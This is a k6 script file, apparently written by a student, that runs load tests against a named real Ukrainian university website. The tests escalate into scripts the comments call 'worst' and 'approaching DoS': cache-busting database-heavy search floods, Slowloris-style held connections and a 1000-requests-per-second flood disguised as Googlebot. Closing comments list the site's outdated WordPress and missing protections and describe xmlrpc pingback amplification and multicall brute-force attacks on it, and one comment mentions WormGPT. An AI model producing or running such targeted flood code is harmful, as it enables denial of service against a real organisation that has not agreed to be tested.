import http from 'k6/http';
import { sleep } from 'k6';

const userAgents = [
    // Desktop
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',

    // Android
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36',

    // iPhone
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile Safari/605.1.15',

    // Tablet
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile Safari/605.1.15'
];

export const options = {
    stages: [
        { duration: '1m', target: 10 },
        { duration: '1m', target: 25 },
        { duration: '1m', target: 50 },
        { duration: '30s', target: 0 },
    ],
};
// export const options = {
//     stages: [
//         { duration: '15s', target: 1000 },
//         { duration: '15s', target: 1500 },
//         { duration: '15s', target: 2500 },
//         { duration: '15s', target: 3800 },
//         { duration: '15s', target: 4900 },
//         { duration: '15s', target: 6900 },
//         { duration: '15s', target: 16900 },
//         { duration: '30s', target: 0 }  // спуск
//     ],
//     thresholds: {
//         http_req_failed: ['rate<0.1'],      // <10% ошибок допустимо
//         http_req_duration: ['p(95)<5000']   // p95 < 5 секунд
//     }
// };
// Вероятнее не положет а заставит диградировать
// export default function () {
//     const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
//
//     http.get('https://www.kisit.kneu.edu.ua/', {
//         headers: {
//             ' "        ____        ",
//             "       /    \\       ",
//             "      | 0  0 |      ",
//             "      |  --  |      ",
//             "      | \\__/ |      ",
//             "       \\____/       ",
//             "      /|    |\\      ",
//             "     / |    | \\     ",
//             "    /  |    |  \\    ",
//             "   /   |____|   \\   ",
//             "       //  \\\\       ",
//             "      //    \\\\      ",
//             "",
//             "   Hello, friend."'
//         }
//     });
// Это уже и незя)
export default function () {
    const ua = userAgents[Math.floor(Math.random() * userAgents.length)];

    http.get('https://www.kisit.kneu.edu.ua/', {
        headers: {
            'X-Load-Test': 'k6-educational',
            'X-Contact': 'student-load-test@example.com'
        }
    });

    sleep(1);
}
//Самый верный вариант по ТЕСТИРОВАНИЮ по моей тоске зрения
import http from 'k6/http';
import { sleep, check } from 'k6';

export const options = {
    stages: [
        { duration: '30s', target: 20 },
        { duration: '1m', target: 50 },
        { duration: '20s', target: 0 },
    ],
    thresholds: {
        // Если более 1% запросов упало (не 200 OK) — тест считается проваленным
        http_req_failed: ['rate<0.01'],
        // 95% запросов должны быть быстрее 2 секунд (учитывая тяжесть WP)
        http_req_duration: ['p(95)<2000'],
    },
};

export default function () {
    const params = {
        headers: {
            'User-Agent': 'k6-performance-audit-v1',
            'X-Target-SLA': '2000ms',
            'Accept-Encoding': 'gzip, deflate',
        },
        // Ограничим время ожидания, чтобы один "зависший" запрос не портил всю статистику
        timeout: '10s',
    };

    const res = http.get('https://www.kisit.kneu.edu.ua/', params);

    // Проверки (Checks) — они не валят тест сами, но отображаются в отчете
    check(res, {
        'status is 200': (r) => r.status === 200,
        'protocol is HTTP/2': (r) => r.proto === 'HTTP/2.0' || r.proto === 'h2',
        'body contains WordPress': (r) => r.body.includes('wp-content'),
    });

    // Имитируем "время на чтение" (Think Time)
    sleep(Math.random() * 2 + 1);
}
// амый НЕВЕРНЫЙ худшый (предупреждение описано в ридми )это для обучения на месте https://www.kisit.kneu.edu.ua/
// Мог быть ваш сайт
import http from 'k6/http';
import { sleep, check } from 'k6';
import { randomString } from 'https://jslib.k6.io/k6-utils/1.2.0/index.js';

export const options = {
    scenarios: {
        // Сценарий 1: Медленные "зомби" соединения
        slow_clients: {
            executor: 'constant-vus',
            vus: 30,
            duration: '2m',
        },
        // Сценарий 2: Тяжелые поисковые запросы (удар по MySQL)
        db_stress: {
            executor: 'ramping-vus',
            startVUs: 0,
            stages: [
                { duration: '1m', target: 20 },
                { duration: '2m', target: 40 },
                { duration: '1m', target: 0 },
            ],
            gracefulRampDown: '30s',
        },
    },
    thresholds: {
        'http_req_duration': ['p(99)>10000'], // Мы хотим увидеть, когда задержка уйдет за 10 сек
    },
};

export default function () {
    const url = 'https://www.kisit.kneu.edu.ua/';

    // 1. Имитируем поиск по случайным строкам.
    // WordPress будет пытаться найти это в БД через LIKE %...%, что крайне тяжело.
    const searchQuery = randomString(5);
    const searchUrl = `${url}?s=${searchQuery}`;

    const params = {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Performance-Test-Bot',
            'X-Purpose': 'Educational-Audit',
            'Cache-Control': 'no-cache', // Заставляем сервер не отдавать кэш, а считать заново
        },
        timeout: '60s',
    };

    const res = http.get(searchUrl, params);

    check(res, {
        'is status 200': (r) => r.status === 200,
        'is slow response': (r) => r.timings.duration > 1000, // Логируем медленные ответы
    });

    // 2. Slowloris-эффект: держим соединение
    sleep(Math.random() * 5 + 2);
}
// Худшый уже подходим к Dos
import http from 'k6/http';

export const options = {
    scenarios: {
        // Жесткий флуд: генерируем фиксированное количество запросов в секунду (RPS)
        // вне зависимости от того, успевает ли сервер отвечать.
        http_flood: {
            executor: 'constant-arrival-rate',
            rate: 1000,             // 1000 запросов в секунду
            timeUnit: '1s',
            duration: '1m',
            preAllocatedVUs: 100,    // Заранее выделяем потоки
            maxVUs: 500,             // Потолок потоков, если сервер начнет тормозить
        },
    },
};

export default function () {
    const url = 'https://www.kisit.kneu.edu.ua/';

    // Убираем все лишнее. Нам нужна минимальная задержка на нашей стороне.
    const params = {
        headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', // Маскировка под гугл-бота
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip',
        },
        timeout: '5s', // Если сервер не ответил за 5 сек — бросаем его и шлем новый
    };

    // Бьем в тяжелую точку (например, главную со множеством скриптов или поиск)
    http.get(url, params);

    // ВНИМАНИЕ: Здесь НЕТ sleep(). Это бесконечный цикл запросов.
}
// Атаки выглядят так:
//
//     0 → 5000 RPS за 1 секунду

//  Атаки:
//
//     curl/7.88
// python-requests
// Go-http-client

// Атака:
//
//     /wp-login.php
//
// /xmlrpc.php
//
// без пауз

//Альтер эго Чата гтп
//WormGPT

// Почему  сайт уязвим к DDoS
//
// Без деталей атаки, только анализ риска:
//
//     ⚠️ Критично
//
// WordPress 4.9.28
// Открыт xmlrpc.php
// Старые плагины
// Нет WAF
// Нет rate‑limit
//
// 👉 Это идеальная цель для автоматических ботов

// Самые популярные сценарии атаки на такую конфигурацию (2025–2026)Pingback amplification DDoS (самый опасный и дешёвый)
// Атакующий шлёт один POST на /xmlrpc.php с методом pingback.ping → сотни/тысячи других WP-сайтов начинают слать запросы на твой сайт. Твой сервер получает в 10–100 раз больше трафика, чем отправил атакующий.
//     Brute-force amplification → CPU/DoS
// Боты используют system.multicall в xmlrpc.php → сотни попыток логина в одном HTTP-запросе → PHP тратит огромное количество CPU → сайт деградирует даже без большого трафика.
//     Прямой HTTP flood на уязвимые эндпоинты  /xmlrpc.php
// /wp-admin/admin-ajax.php (особенно со старыми плагинами)
// /wp-login.php (если нет лимита)
// → даже 1–3 Гбит/с уже достаточно, чтобы положить типичный shared/VPS сервер.

